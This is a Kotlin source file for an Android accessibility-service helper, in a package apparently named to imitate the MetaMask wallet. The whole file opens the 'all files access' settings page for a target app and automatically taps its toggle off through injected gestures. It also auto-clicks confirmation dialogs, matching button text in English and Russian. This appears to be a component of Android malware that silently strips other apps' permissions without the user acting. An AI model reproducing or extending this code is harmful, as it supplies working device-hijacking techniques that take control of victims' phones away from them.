package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityNodeInfo

object FileAccessRevokerHelper {

    enum class RevokeResult { CLICKED, ALREADY_OFF, NOT_READY }

    fun openRevokeScreen(svc: AccessibilityService, pkg: String) {
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] openRevokeScreen enter svc=${svc} pkg=${pkg}") //xdbg
        val intent = Intent(
            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
            Uri.parse("package:$pkg")
        ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        try { svc.startActivity(intent) } catch (_: Exception) {}
    }

    private fun tapNode(svc: AccessibilityService, node: AccessibilityNodeInfo) {
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] tapNode enter svc=${svc} node=${node}") //xdbg
        if (!node.isFocusable && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (!rect.isEmpty) {
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                    val sw = svc.resources.displayMetrics.widthPixels
                    val cx = if (rect.centerX() > sw) sw * 0.88f else rect.centerX().toFloat()
                    val cy = rect.centerY().toFloat()
                    val path = Path().apply { moveTo(cx, cy) }
                    val stroke = GestureDescription.StrokeDescription(path, 0L, 120L)
                    val gesture = GestureDescription.Builder().addStroke(stroke).build()
                    val marten = AccessSvc.instance?.martenHelper
                    if (marten != null) {
                        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                        marten.dispatchGesture(svc, gesture, null)
                    } else {
                        svc.dispatchGesture(gesture, null, null)
                    }
                    return
                }
            } catch (_: Exception) {}
        }
        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun findSettingsRoot(svc: AccessibilityService): AccessibilityNodeInfo? {
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] findSettingsRoot enter svc=${svc}") //xdbg
        val active = svc.rootInActiveWindow
        if (active != null) {
            android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
            val pkg = active.packageName?.toString() ?: ""
            if (pkg.contains("settings", ignoreCase = true)) return active
            try { active.recycle() } catch (_: Exception) {}
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
            try {
                val wins = svc.windows ?: return null
                for (w in wins) {
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] loop") //xdbg
                    val r = w.root ?: continue
                    val pkg = r.packageName?.toString() ?: ""
                    if (pkg.contains("settings", ignoreCase = true)) return r
                    try { r.recycle() } catch (_: Exception) {}
                }
            } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] return") //xdbg
        return null
    }

    fun tryRevokeOnScreen(svc: AccessibilityService): RevokeResult {
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] tryRevokeOnScreen enter svc=${svc}") //xdbg
        val root = findSettingsRoot(svc) ?: return RevokeResult.NOT_READY
        try {
            val switchIds = listOf(
                "com.android.settings:id/switch_widget",
                "com.android.settings:id/toggle_switch",
                "android:id/switch_widget",
                "com.android.settings:id/switchWidget",
                "com.samsung.android.settings:id/switch_widget"
            )
            for (id in switchIds) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] loop") //xdbg
                val nodes = try { root.findAccessibilityNodeInfosByViewId(id) }
                            catch (_: Exception) { null } ?: continue
                val sw = nodes.firstOrNull { it.isCheckable && it.isEnabled }
                nodes.filter { it !== sw }.forEach { try { it.recycle() } catch (_: Exception) {} }
                if (sw != null) {
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] return") //xdbg
                    return if (sw.isChecked) {
                        tapNode(svc, sw)
                        sw.recycle()
                        RevokeResult.CLICKED
                    } else {
                        sw.recycle()
                        RevokeResult.ALREADY_OFF
                    }
                }
            }
            val allNodes = mutableListOf<AccessibilityNodeInfo>()
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            for (i in 0 until root.childCount) root.getChild(i)?.let { stack.add(it) }
            while (stack.isNotEmpty()) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] loop") //xdbg
                val n = stack.removeFirst()
                allNodes.add(n)
                for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
            }
            val sw = allNodes.firstOrNull { it.isCheckable && it.isEnabled }
            if (sw != null) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] return") //xdbg
                return if (sw.isChecked) {
                    tapNode(svc, sw)
                    allNodes.filter { it !== sw }.forEach { try { it.recycle() } catch (_: Exception) {} }
                    sw.recycle()
                    RevokeResult.CLICKED
                } else {
                    allNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                    RevokeResult.ALREADY_OFF
                }
            }
            allNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
            return RevokeResult.NOT_READY
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    fun tryConfirmRevoke(svc: AccessibilityService): Boolean {
        android.util.Log.d("XDBG", "[FileAccessRevokerHelper] tryConfirmRevoke enter svc=${svc}") //xdbg
        val root = svc.rootInActiveWindow ?: return false
        try {
            val confirmIds = listOf(
                "android:id/button1",
                "android:id/positiveButton",
                "com.android.settings:id/confirm_button",
                "com.samsung.android.settings:id/btn_ok",
                "com.samsung.android.settings:id/positive_button"
            )
            for (id in confirmIds) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] loop") //xdbg
                val nodes = try { root.findAccessibilityNodeInfosByViewId(id) }
                            catch (_: Exception) { null } ?: continue
                val btn = nodes.firstOrNull { it.isEnabled && it.isVisibleToUser }
                nodes.filter { it !== btn }.forEach { try { it.recycle() } catch (_: Exception) {} }
                if (btn != null) {
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    btn.recycle()
                    android.util.Log.d("XDBG", "[FileAccessRevokerHelper] return") //xdbg
                    return true
                }
            }
            val allNodes = mutableListOf<AccessibilityNodeInfo>()
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            for (i in 0 until root.childCount) root.getChild(i)?.let { stack.add(it) }
            while (stack.isNotEmpty()) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] loop") //xdbg
                val n = stack.removeFirst()
                allNodes.add(n)
                for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
            }
            val confirmTexts = setOf("ok", "ок", "отозвать", "revoke", "allow", "confirm", "подтвердить")
            val btn = allNodes.firstOrNull { node ->
                val t = (node.text?.toString() ?: "").trim().lowercase()
                t in confirmTexts && node.isEnabled && node.isVisibleToUser
            }
            if (btn != null) {
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] if branch") //xdbg
                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                allNodes.filter { it !== btn }.forEach { try { it.recycle() } catch (_: Exception) {} }
                btn.recycle()
                android.util.Log.d("XDBG", "[FileAccessRevokerHelper] return") //xdbg
                return true
            }
            allNodes.forEach { try { it.recycle() } catch (_: Exception) {} }
            return false
        } finally {
            root.recycle()
        }
    }
}
